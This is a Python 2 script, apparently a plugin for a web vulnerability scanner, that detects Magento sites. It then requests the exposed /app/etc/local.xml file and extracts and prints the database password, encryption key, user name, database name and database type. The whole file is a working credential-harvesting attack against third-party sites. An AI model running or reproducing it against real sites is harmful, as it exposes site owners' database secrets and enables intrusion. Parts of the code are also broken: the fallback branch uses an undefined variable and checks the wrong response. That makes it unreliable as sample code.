# Detects Magento CMS
# @penetrat0r
# Need to add version checks

import requests
import re

directories = ["robots.txt","js/lib/flex.js"]

def check(header, content, targetURL):

    r = requests.get(targetURL + "app/etc/local.xml")

    if "Magento default".upper() in content or "Mage.Cookies.path".upper() in content or "Magento".upper() in content:
        try:
            print "\n** Potentially serious vulnerability discovered.  The /app/etc/local.xml configuration file is exposed to the internet. **"

            connPass = getPass(r.content)
            cryptKey = getKey(r.content)
            dbUser = getUser(r.content)
            dbName = getDBName(r.content)
            dbType = getDBType(r.content)
            print "The following sensitive information was disclosed: \n"
            print "Password: " + connPass
            print "Crypt key: " + cryptKey
            print "Database user name: " + dbUser
            print "Database name: " + dbName
            print "Database type: " + dbType
        
        except Exception:
            pass

        return True
    else:    
        for directory in directories:
            r = requests.get(targetURL + directory)
            if r.status_code == 200: 
                if "Magento".upper() in content:
                    if exposed == True:
                        return True

def getPass(content):
    m = re.compile('<password>(.*?)</password>').search(content)
    y = m.group(1).split("CDATA[")
    x = y[1]
    z = x.split("]]>")

    return z[0]

def getKey(content):
    m = re.compile('<key>(.*?)</key').search(content)
    y = m.group(1).split("CDATA[")
    x = y[1]
    z = x.split("]]>")

    return z[0]

def getUser(content):
    m = re.compile('<username>(.*?)</username').search(content)
    y = m.group(1).split("CDATA[")
    x = y[1]
    z = x.split("]]>")

    return z[0]

def getDBName(content):
    m = re.compile('<dbname>(.*?)</dbname').search(content)
    y = m.group(1).split("CDATA[")
    x = y[1]
    z = x.split("]]>")

    return z[0]

def getDBType(content):
    m = re.compile('<model>(.*?)</model').search(content)
    y = m.group(1).split("CDATA[")
    x = y[1]
    z = x.split("]]>")

    return z[0]
